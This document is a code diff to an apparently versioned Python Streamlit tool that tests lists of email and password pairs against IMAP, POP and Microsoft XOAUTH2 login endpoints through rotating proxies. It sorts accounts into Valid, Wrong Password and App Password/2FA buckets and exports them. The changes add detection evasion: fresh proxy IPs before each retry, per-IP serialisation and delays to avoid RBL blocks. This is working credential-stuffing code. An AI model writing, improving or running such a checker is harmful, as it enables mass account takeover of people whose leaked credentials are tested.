                 trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")
 
         px = None
@@ -4385,22 +4670,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             trace_logs.append("No candidate hosts for this domain.")
             return None, FAILED, "no candidate hosts", None, trace_logs
 
-        rung_cost = max(8.0, min(configured_to, 12.0))
-        work_floor = (len(primary_plan) * rung_cost * 1.5) + 15.0
-        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", 90)) * 0.95)
+        rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
+        work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
+        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)) * 0.95)
         if work_floor > budget:
             trace_logs.append(
                 f"Budget floored to fit the work: {work_floor:.0f}s "
-                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x 1.5 + 15s) "
+                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x {WORK_FLOOR_FACTOR} + {WORK_FLOOR_PAD:.0f}s) "
                 f"instead of the {budget:.0f}s the Deadline slider allows.")
             budget = work_floor
 
-        proxy_deadline = t_start + (budget * 0.62)
-        proxy_primary_deadline = t_start + (budget * 0.45)
+        proxy_deadline = t_start + (budget * PROXY_TOTAL_FRAC)
+        proxy_primary_deadline = t_start + (budget * PROXY_PRIMARY_FRAC)
         hard_deadline = t_start + budget
-        direct_primary_deadline = t_start + (budget * 0.82)
+        direct_primary_deadline = t_start + (budget * DIRECT_PRIMARY_FRAC)
         trace_logs.append(
-            f"Account window {budget:.0f}s -> proxy {budget * 0.62:.0f}s / direct {budget * 0.38:.0f}s "
+            f"Account window {budget:.0f}s -> proxy {budget * PROXY_PRIMARY_FRAC:.0f}s-{budget * PROXY_TOTAL_FRAC:.0f}s / "
+            f"direct {budget * DIRECT_PRIMARY_FRAC:.0f}s-{budget:.0f}s "
             f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")
 
         def _is_timeout(err):
@@ -4424,11 +4710,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     pop_plain_once(user, password, server, px_used, port=port, attempt_timeout=attempt_to)
 
         def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
-            """Serialised per destination host, per proxy IP, and globally.
-
-            v13.29: the IP gate is acquired INSIDE the proxy gate so three workers
-            cannot ride the same source IP into one mail host.
-            """
+            """Serialised per destination host, per proxy IP, and globally."""
             gate = _host_gate(server)
             got_host = gate.acquire(timeout=max(2.0, attempt_to))
             try:
@@ -4456,12 +4738,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
         err_text = ""
 
-        def try_ms_xoauth2(server, px_used, attempt_to):
+        def try_ms_xoauth2(server, px_used, attempt_to, err_snapshot=""):
             if not MS_OAUTH_OK:
                 return None
             if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                 return None
-            if not ms_oauth.should_try_ms_xoauth2(server, err_text, domain):
+            # v13.30: the error is passed EXPLICITLY.  It used to be read from an
+            # enclosing scope that sweep() shadowed, so the gate always saw "".
+            if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
                 return None
             try:
                 exists, claims = ms_oauth.imap_xoauth2_once(
@@ -4482,10 +4766,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 return None
             except ms_oauth.MsTokenRejected as tr:
                 if tr.verdict == "wrong_password":
-                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password")
+                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password", server)
                     trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> wrong password")
                 elif tr.verdict == "need_app_password":
-                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required")
+                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required", server)
                     trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> MFA, app password required")
                 else:
                     trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> no verdict change")
@@ -4511,6 +4795,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return px_used, False
 
         def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
+            nonlocal err_text
             had_net = False
             saw_retry = False
             if not rungs:
@@ -4562,7 +4847,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                         try:
                             do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts)
                             record_proxy_attempt(px_used, success=True)
-                            note_verdict(VALID, f"{proto} {server}:{port}")
+                            note_verdict(VALID, f"{proto} {server}:{port}", server)
                             note = "" if user == primary_user else f" | User: {user} (local-part)"
                             trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} verification OK on {server}:{port}{note}")
                             return (server, VALID,
@@ -4570,8 +4855,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     px_used, trace_logs), had_net, saw_retry
 
                         except ProxyAuthError as pae:
-                            # v13.29: ONLY a real credential rejection on the
-                            # PREFERRED scheme reaches here.
                             err_text = str(pae)
                             flags["saw_407"] = True
                             record_proxy_attempt(px_used, success=False,
@@ -4585,7 +4868,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             rotate_now = True
 
                         except ProxyTransportError as pte:
-                            # v13.29: a broken tunnel. NOT a 407, NOT a verdict.
                             err_text = str(pte)
                             flags["saw_nonproxy"] = True
                             had_net = True
@@ -4607,7 +4889,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 net_failed_hosts.add(server)
                             record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
                             trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
-                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
                             server_level_fail = True
                             rotate_now = _is_proxy_level_error(err_text) or st_val == FAILED
 
@@ -4640,7 +4922,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     retry_same = True
 
                         except (socket.error, ConnectionRefusedError) as sock_err:
-                            # v13.29: a raw reset. ROTATE - do not burn the rung.
+                            # v13.30: a raw reset ROTATES.  It used to also set
+                            # retry_same, and that branch ran first - so the first
+                            # reset dialled the SAME node and the SAME source IP.
                             err_text = str(sock_err)
                             flags["saw_nonproxy"] = True
                             had_net = True
@@ -4649,9 +4933,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {FAILED}]")
                             server_level_fail = True
                             rotate_now = True
-                            if retries_by_host.get(server, 0) < same_host_retries and (deadline_ts - time.time()) > 7.0:
-                                retries_by_host[server] = retries_by_host.get(server, 0) + 1
-                                retry_same = True
 
                         except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                             err_text = str(proto_err)
@@ -4659,14 +4940,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             flags["saw_nonproxy"] = True
                             record_proxy_attempt(px_used, success=False, is_network_error=False)
                             trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
-                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
 
                             if st_val == APP:
-                                xres = try_ms_xoauth2(server, px_used, attempt_to)
+                                xres = try_ms_xoauth2(server, px_used, attempt_to, err_text)
                                 if xres:
                                     return xres, had_net, saw_retry
                                 if u_idx + 1 < len(users):
-                                    # v13.29: fresh node for the local-part retry.
                                     px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                     trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                     continue
@@ -4687,8 +4967,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 trace_logs.append(f"{px_tag(px_used)} RBL block on {server}:{port} -> IP flagged by server, advancing")
                                 server_level_fail = True
                             elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
-                                # v13.29: rotate before the local-part retry, so the
-                                # second back-to-back connect does not reuse the IP.
                                 px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                 continue
@@ -4728,10 +5006,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 net_failed_hosts.add(server)
                             record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
                             trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
-                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
 
                             if st_val == APP:
-                                xres = try_ms_xoauth2(server, px_used, attempt_to)
+                                xres = try_ms_xoauth2(server, px_used, attempt_to, err_text)
                                 if xres:
                                     return xres, had_net, saw_retry
                                 if u_idx + 1 < len(users):
@@ -4782,9 +5060,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
                     if retry_same and (deadline_ts - time.time()) > 5.0:
                         trace_logs.append(
-                            f"{px_tag(px_used)} Host answered slowly -> backoff 1.2s, retrying "
+                            f"{px_tag(px_used)} Host answered slowly -> backoff {SLOW_RETRY_BACKOFF}s, retrying "
                             f"{server}:{port} in place [{retries_by_host.get(server, 0)}/{same_host_retries}]")
-                        time.sleep(1.2)
+                        time.sleep(SLOW_RETRY_BACKOFF)
                         continue
 
                     can_rotate = (
@@ -4792,6 +5070,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                         and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                     )
                     if can_rotate:
+                        time.sleep(ROTATE_SETTLE)
                         newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
                         if newpx and newpx not in seen_px:
                             seen_px.add(newpx)
@@ -4883,11 +5162,12 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
         if direct_first and allow_direct:
             trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
-            res = _run_direct(t_start + (budget * 0.45), t_start + (budget * 0.70))
+            res = _run_direct(t_start + (budget * DIRECT_FIRST_DIRECT_PRIMARY_FRAC),
+                              t_start + (budget * DIRECT_FIRST_DIRECT_TOTAL_FRAC))
             if res:
                 return res
             if allow_proxy:
-                res = _run_proxy(t_start + (budget * 0.88), hard_deadline)
+                res = _run_proxy(t_start + (budget * DIRECT_FIRST_PROXY_START_FRAC), hard_deadline)
                 if res:
                     return res
         else:
@@ -4914,15 +5194,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         failed_domain_cache[domain] = time.time()
 
     if best_verdict["status"] is not None:
+        _bh = best_verdict.get("host") or ""
+        _foreign = bool(_bh) and not _is_local_host(_bh)
+        detail = best_verdict["detail"] or "retained verdict"
+        if _foreign:
+            # v13.30: be explicit when the retained verdict came off a host that
+            # is not this account's own provider.
+            detail = f"{detail} [retained via FOREIGN host {_bh}]"
+            trace_logs.append(
+                f"NOTE: the retained verdict came from {_bh}, which is not a local host for "
+                f"{domain}. It may belong to a different provider.")
         trace_logs.append(
-            f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}]."
-        )
-        return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
+            f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}].")
+        return None, best_verdict["status"], detail, None, trace_logs
     if flags["saw_407"] and not flags["saw_nonproxy"]:
         trace_logs.append(
             f"Every attempt died in the PROXY hop ({quarantine_size()} node(s) quarantined) "
-            f"-> the mailbox was never reached, so the password is still untested."
-        )
+            f"-> the mailbox was never reached, so the password is still untested.")
         return None, PROXY_UNHEALTHY, (
             f"every attempt failed in the proxy hop (407) - "
             f"{quarantine_size()} node(s) quarantined; fix/replace the proxy pool"
@@ -4947,6 +5235,8 @@ RESULT_ACTION_MODES = [
     ("🚫 RBL Blocked Found", "rbl_results"),
     ("🔌 Connection Failed Found", "conn_results"),
     ("🩹 Proxy Unhealthy Found", "proxy_results"),
+    ("⏭ Skipped / Filtered Found", "skip_results"),
+    ("❓ Unclassified Found", "unknown_results"),
 ]
 
 ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in RESULT_ACTION_MODES]
@@ -5020,8 +5310,17 @@ if start_engine_btn:
         str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'.")
     else:
         filtered_pool[:] = get_filtered_active_proxies()
-        if not alive_pool:
-            refresh_alive_pool()
+
+        # v13.30: mark the run live, resolve the AUTO probe target from THIS
+        # queue, then force one probe so the pool reflects the real hosts.
+        STATE["run_active"] = True
+        _tg = _set_probe_targets_from_queue(accounts_to_check)
+        if _tg and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
+            clear_tunnel_cache()
+            refresh_alive_pool(force=True)
+        elif not alive_pool:
+            refresh_alive_pool(force=True)
+
         if alive_pool:
             active_proxy_pool = list(alive_pool)
         elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
@@ -5053,6 +5352,7 @@ if start_engine_btn:
             str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
             str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
             str_lit.session_state.skip_results = []
+            str_lit.session_state.unknown_results = []
             str_lit.session_state.report_entries = []
             str_lit.session_state.log_lines = []
             str_lit.session_state.checked_emails_set = set()
@@ -5080,6 +5380,8 @@ if start_engine_btn:
                 ("rbl_results", "🚫 RBL Blocked Found"),
                 ("smtp_results", "📮 SMTP Failed (pre-check)"),
                 ("dns_results", "🛰 DNS Failed (pre-check)"),
+                ("skip_results", "⏭ Skipped / Filtered"),
+                ("unknown_results", "❓ Unclassified"),
             ]
             for _key, _title in BUCKET_SPEC:
                 with str_lit.expander(f"{_title}", expanded=False):
@@ -5109,6 +5411,7 @@ if start_engine_btn:
                         "need_app_results": "NEED_APP_PASSWORD",
                         "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
                         "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
+                        "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
                     }.get(key, ""), "#cbd5e1")
                     for ln in items[-250:]:
                         str_lit.markdown(
@@ -5161,7 +5464,7 @@ if start_engine_btn:
                 for index, future in enumerate(as_completed(future_to_line), 1):
                     checked_count += 1
                     try:
-                        res = future.result(timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + 60)
+                        res = future.result(timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
                         if res:
                             st_val = res["status"]
                             em_val = res.get('email', '').strip().lower()
@@ -5190,6 +5493,8 @@ if start_engine_btn:
                                     str_lit.session_state.proxy_results.append(res["line"])
                                 elif st_val == SKIP:
                                     str_lit.session_state.skip_results.append(res["line"])
+                                elif st_val == UNKNOWN:
+                                    str_lit.session_state.unknown_results.append(res["line"])
                                 else:
                                     str_lit.session_state.conn_results.append(res["line"])
 
@@ -5215,6 +5520,8 @@ if start_engine_btn:
                                 retry_len = len(str_lit.session_state.retry_results)
                                 rbl_len = len(str_lit.session_state.rbl_results)
                                 smtp_len = len(str_lit.session_state.smtp_results)
+                                skip_len = len(str_lit.session_state.skip_results)
+                                unknown_len = len(str_lit.session_state.unknown_results)
                                 current_logs = list(str_lit.session_state.log_lines)
                                 current_reports = list(str_lit.session_state.report_entries)
                                 bucket_snapshot = {
@@ -5227,6 +5534,8 @@ if start_engine_btn:
                                     "rbl_results": list(str_lit.session_state.rbl_results),
                                     "smtp_results": list(str_lit.session_state.smtp_results),
                                     "dns_results": list(str_lit.session_state.dns_results),
+                                    "skip_results": list(str_lit.session_state.skip_results),
+                                    "unknown_results": list(str_lit.session_state.unknown_results),
                                 }
 
                             time.sleep(0.01)
@@ -5237,15 +5546,20 @@ if start_engine_btn:
                                 log_container.code("\n".join(current_logs), language="text")
 
                             with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4, r_col5, r_col6, r_col7, r_col8 = str_lit.columns(8)
-                                r_col1.metric("✅ Valid", valid_len)
-                                r_col2.metric("❌ Wrong", wrong_len)
-                                r_col3.metric("🔑 AppPass/2FA", need_len)
-                                r_col4.metric("🔌 Conn Failed", conn_len)
-                                r_col5.metric("🩹 Proxy Dead", proxy_len)
-                                r_col6.metric("🚫 RBL", rbl_len)
-                                r_col7.metric("🕓 RETRY_LATER", retry_len)
-                                r_col8.metric("📮 SMTP Failed", smtp_len)
+                                m_row1 = str_lit.columns(6)
+                                m_row1[0].metric("✅ Valid", valid_len)
+                                m_row1[1].metric("❌ Wrong", wrong_len)
+                                m_row1[2].metric("🔑 AppPass/2FA", need_len)
+                                m_row1[3].metric("🔌 Conn Failed", conn_len)
+                                m_row1[4].metric("🩹 Proxy Dead", proxy_len)
+                                m_row1[5].metric("🕓 RETRY_LATER", retry_len)
+                                m_row2 = str_lit.columns(6)
+                                m_row2[0].metric("🚫 RBL", rbl_len)
+                                m_row2[1].metric("📮 SMTP Failed", smtp_len)
+                                m_row2[2].metric("⏭ Skipped", skip_len)
+                                m_row2[3].metric("❓ Unclassified", unknown_len)
+                                m_row2[4].metric("📋 Checked", checked_count)
+                                m_row2[5].metric("📚 Queue", total_accs)
 
                             render_buckets(bucket_snapshot)
                             report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=320)
@@ -5316,6 +5630,7 @@ if start_engine_btn:
             else:
                 detected_stop_reason = f"Unexpected Error / Interruption: {be}"
         finally:
+            STATE["run_active"] = False
             with session_state_lock:
                 done = set(str_lit.session_state.checked_emails_set)
             left = [raw for raw in all_target_accounts
@@ -5341,6 +5656,8 @@ if start_engine_btn:
             rbl_snapshot = list(str_lit.session_state.rbl_results)
             smtp_snapshot = list(str_lit.session_state.smtp_results)
             dns_snapshot = list(str_lit.session_state.dns_results)
+            skip_snapshot = list(str_lit.session_state.skip_results)
+            unknown_snapshot = list(str_lit.session_state.unknown_results)
 
         progress_bar.progress(1.0, text="Checking complete!")
         status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")
@@ -5356,6 +5673,8 @@ if start_engine_btn:
             rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
             smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
             dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
+            skip_path = os.path.join(CFG["RESULTS_DIR"], f"skipped_{stamp}.txt")
+            unknown_path = os.path.join(CFG["RESULTS_DIR"], f"unclassified_{stamp}.txt")
             try:
                 os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
             except OSError:
@@ -5367,7 +5686,8 @@ if start_engine_btn:
                                    (need_path, need_snapshot), (failed_path, conn_snapshot),
                                    (proxy_path, proxy_snapshot),
                                    (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
-                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot)):
+                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
+                                   (skip_path, skip_snapshot), (unknown_path, unknown_snapshot)):
                     with open(path, "w", encoding="utf-8") as f:
                         f.write(hdr)
                         f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))
@@ -5393,7 +5713,9 @@ if start_engine_btn:
                                (retry_path, os.path.basename(retry_path)),
                                (rbl_path, os.path.basename(rbl_path)),
                                (smtp_path, os.path.basename(smtp_path)),
-                               (dns_path, os.path.basename(dns_path))):
+                               (dns_path, os.path.basename(dns_path)),
+                               (skip_path, os.path.basename(skip_path)),
+                               (unknown_path, os.path.basename(unknown_path))):
                     if os.path.exists(p):
                         z.write(p, arcname=arc)
 
@@ -5428,6 +5750,8 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         rbl_len_val = len(str_lit.session_state.rbl_results)
         smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
         dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
+        skip_len_val = len(str_lit.session_state.skip_results)
+        unknown_len_val = len(str_lit.session_state.unknown_results)
         valid_res_copy = list(str_lit.session_state.valid_results)
         log_lines_copy = list(str_lit.session_state.log_lines)
         report_entries_copy = list(str_lit.session_state.report_entries)
@@ -5446,6 +5770,8 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
             "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
             "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
             "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
+            "⏭ Skipped / Filtered": list(str_lit.session_state.skip_results),
+            "❓ Unclassified": list(str_lit.session_state.unknown_results),
         }
 
     str_lit.markdown(f"### {status_label}")
@@ -5463,21 +5789,32 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
     if start_ts_copy and end_ts_copy:
         str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | Ended **{end_ts_copy}** | Duration **{duration_copy}**")
 
-    c1, c2, c3, c4, c5, c6, c7, c8, c9 = str_lit.columns(9)
-    c1.metric("✅ Clean Valid", clean_count_val)
-    c2.metric("❌ Wrong Password", wrong_len_val)
-    c3.metric("🔑 App Password / 2FA", need_len_val)
-    c4.metric("🔌 Connection Failed", conn_len_val)
-    c5.metric("🩹 Proxy Unhealthy", proxy_len_val)
-    c6.metric("🚫 RBL Blocked", rbl_len_val)
-    c7.metric("🕓 RETRY_LATER", retry_len_val)
-    c8.metric("🛰 DNS Failed", dns_len_val)
-    c9.metric("📮 SMTP Failed", smtp_len_val)
+    c_row1 = str_lit.columns(6)
+    c_row1[0].metric("✅ Clean Valid", clean_count_val)
+    c_row1[1].metric("❌ Wrong Password", wrong_len_val)
+    c_row1[2].metric("🔑 App Password / 2FA", need_len_val)
+    c_row1[3].metric("🔌 Connection Failed", conn_len_val)
+    c_row1[4].metric("🩹 Proxy Unhealthy", proxy_len_val)
+    c_row1[5].metric("🚫 RBL Blocked", rbl_len_val)
+    c_row2 = str_lit.columns(6)
+    c_row2[0].metric("🕓 RETRY_LATER", retry_len_val)
+    c_row2[1].metric("🛰 DNS Failed", dns_len_val)
+    c_row2[2].metric("📮 SMTP Failed", smtp_len_val)
+    c_row2[3].metric("⏭ Skipped", skip_len_val)
+    c_row2[4].metric("❓ Unclassified", unknown_len_val)
+    c_row2[5].metric("📚 Accounts In Buckets",
+                     clean_count_val + wrong_len_val + need_len_val + conn_len_val +
+                     proxy_len_val + rbl_len_val + retry_len_val + skip_len_val + unknown_len_val)
 
     if proxy_len_val:
         str_lit.warning(
             f"🩹 **{proxy_len_val} account(s) never reached a mailbox** — every attempt died with "
             f"407 Proxy Authentication Required. Those passwords are still UNTESTED."
+        )
+    if skip_len_val:
+        str_lit.info(
+            f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / fast-mode cooldown). "
+            f"They were counted as checked; they are listed in the Skipped bucket and the ZIP."
         )
 
     for title, items in summary_buckets.items():
